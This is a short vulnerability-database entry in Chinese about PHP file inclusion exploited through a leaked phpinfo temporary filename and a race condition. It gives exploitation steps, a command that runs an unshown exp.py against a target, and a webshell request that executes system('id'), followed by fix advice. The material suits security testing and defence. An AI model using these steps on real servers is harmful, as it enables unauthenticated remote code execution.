---
id: PHP-INCLUSION
title: PHP文件包含漏洞（利用phpinfo）
product: php
vendor: PHP
version_affected: "任意版本（配置相关）"
severity: CRITICAL
tags: [rce, file_read, 无需认证]
fingerprint: ["PHP"]
---

## 漏洞描述

PHP文件包含漏洞中，如果找不到可包含的文件，可以通过包含临时文件的方法来getshell。临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，然后利用条件竞争进行包含。

## 影响版本

- 任意版本（取决于配置）

## 前置条件

- 无需认证
- 目标存在文件包含漏洞和phpinfo页面

## 利用步骤

1. 利用 phpinfo 页面获取临时文件名
2. 利用条件竞争在临时文件删除前包含它

## Payload

```bash
# 使用 exp.py 进行利用
python2 exp.py target-ip 8080 100

# 成功后会写入 /tmp/g
# 然后访问 lfi.php?file=/tmp/g&1=system('id');
```

## 验证方法

```bash
# 检查是否成功写入 webshell
```

## 修复建议

1. 修复文件包含漏洞，对用户输入进行严格过滤
2. 禁用 phpinfo 页面或限制访问
3. 升级 PHP 并配置 open_basedir
